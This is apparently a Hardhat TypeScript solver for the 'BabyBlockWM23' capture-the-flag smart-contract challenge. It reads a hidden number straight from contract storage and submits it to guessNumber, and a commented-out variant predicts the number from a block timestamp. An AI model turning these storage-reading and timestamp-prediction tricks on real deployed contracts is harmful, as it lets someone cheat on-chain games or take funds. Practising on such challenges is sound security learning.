import chalk from "chalk";
import { ethers } from "hardhat";
import { BabyBlockWM23__factory, BabyBlockWM23 } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    // let tx = "0xcb2d1f40783046b623e39312267ad91ecf40ee338fb1631c2526c96af7f7e3b2";
    // let contractAddress = "0xCe8B517e34f7b5C95Dfc16931fC0eC5E41796327";
    // let [challengeContract, attacker] = await initialize<ChallengeWM23>(ChallengeWM23__factory, undefined, undefined, undefined, contractAddress);
    
    // let blockHash = (await ethers.provider.getTransaction(tx))?.blockHash;
    // if (blockHash) {
    //     let block = await ethers.provider.getBlock(blockHash);
    //     let timestamp = block?.timestamp;
    //     if (timestamp) {
    //         let number = timestamp % 10 +1;
    //         let tx = await challengeContract.guessNumber(number);
    //         await tx.wait();
    //         log(`Is Solved: ${chalk.yellow(await challengeContract.isSolved())}`);
    //     }
    // }

    let [BabyBlockContract, attacker] = await initialize<BabyBlockWM23>(BabyBlockWM23__factory);
    let number = await ethers.provider.getStorage(await BabyBlockContract.getAddress(), 1);
    let tx = await BabyBlockContract.guessNumber(number);
    await tx.wait();
    log(`Is Solved: ${chalk.yellow(await BabyBlockContract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});